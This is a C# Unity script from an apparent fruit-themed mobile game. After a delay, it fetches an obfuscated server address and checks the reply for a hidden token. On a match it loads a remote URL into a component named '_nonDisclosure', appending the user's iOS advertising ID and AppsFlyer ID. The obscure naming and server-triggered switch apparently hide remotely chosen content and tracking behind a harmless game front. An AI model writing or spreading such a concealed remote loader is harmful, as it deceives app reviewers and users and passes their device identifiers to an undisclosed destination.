using System.Collections;
using _AdditionalScripts.SweetFruits.DataScripts;
using AppsFlyerSDK;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;

namespace _AdditionalScripts.SweetFruits.controlllers
{
    public class FruitGatherer : MonoBehaviour
    {
        private string traceCode;

        [SerializeField] private DictionaryDB _dictionaryDB;

        private string labeling;


        private void Disao()
        {
            UI_HelpObj.FadeCanvasGroup(gameObject, false);
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            iosIdfaCheck.ScrutinizeIDFA();
            StartCoroutine(IDFAGet());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    DontConnect();
                    break;
                default:
                    GetTop();
                    break;
            }
        }

        private void DontConnect()
        {
            print("NO_DATA");

            Disao();
        }


        private IEnumerator IDFAGet()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            traceCode = iosIdfaCheck.RetrieveAdvertisingID();
            yield return null;
        }

        private void GetTop()
        {
            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
            {
                LoadSavePP();
            }
            else
            {
                FetchDataFromServerWithDelay();
            }
        }

        private void LoadSavePP()
        {
            globalLocator1 = PlayerPrefs.GetString("top", string.Empty);
            globalLocator2 = PlayerPrefs.GetString("top2", string.Empty);
            globalLocator3 = PlayerPrefs.GetInt("top3", 0);
            CheckSave();
        }

        private void FetchDataFromServerWithDelay()
        {
            Invoke(nameof(GetDataFier), 7.4f);
        }

        private void GetDataFier()
        {
            if (Application.internetReachability == networkReachability)
            {
                DontConnect();
            }
            else
            {
                StartCoroutine(FetchDataFromServer());
            }
        }

        private IEnumerator FetchDataFromServer()
        {
            using UnityWebRequest webRequest =
                UnityWebRequest.Get(fruitsConnect.Connneeeectatear(_dictionaryDB.DictFruits1));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                DontConnect();
            }
            else
            {
                DataResponseFier(webRequest);
            }
        }

        private void Awake()
        {
            MoreThenOne();
        }

        [SerializeField] private FruitsConnect fruitsConnect;

        private bool isFirstInstance = true;
        private NetworkReachability networkReachability = NetworkReachability.NotReachable;


        private string globalLocator1 { get; set; }
        private string globalLocator2;
        private int globalLocator3;


        private void DataResponseFier(UnityWebRequest webRequest)
        {
            string tokenConcatenation = fruitsConnect.Connneeeectatear(_dictionaryDB.DictFruits2);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("top", dataParts[0]);
                    PlayerPrefs.SetString("top2", dataParts[1]);
                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));

                    globalLocator1 = dataParts[0];
                    globalLocator2 = dataParts[1];
                    globalLocator3 = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
                    globalLocator1 = webRequest.downloadHandler.text;
                }

                CheckSave();
            }
            else
            {
                DontConnect();
            }
        }


        public void qwertyui()
        {
            _nonDisclosure.High = globalLocator3;
            _nonDisclosure.gameObject.SetActive(true);
        }

        private void MoreThenOne()
        {
            switch (isFirstInstance)
            {
                case true:
                    isFirstInstance = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private void CheckSave()
        {
            _nonDisclosure.GETStringo = $"{globalLocator1}?idfa={traceCode}";
            _nonDisclosure.GETStringo +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("Result", string.Empty)}";
            _nonDisclosure.PPssadaGG = globalLocator2;


            qwertyui();
        }

        [SerializeField] private BerryBush _nonDisclosure;
        [SerializeField] private IOSIdfaController iosIdfaCheck;

        // Add the rest of your methods as needed...
    }
}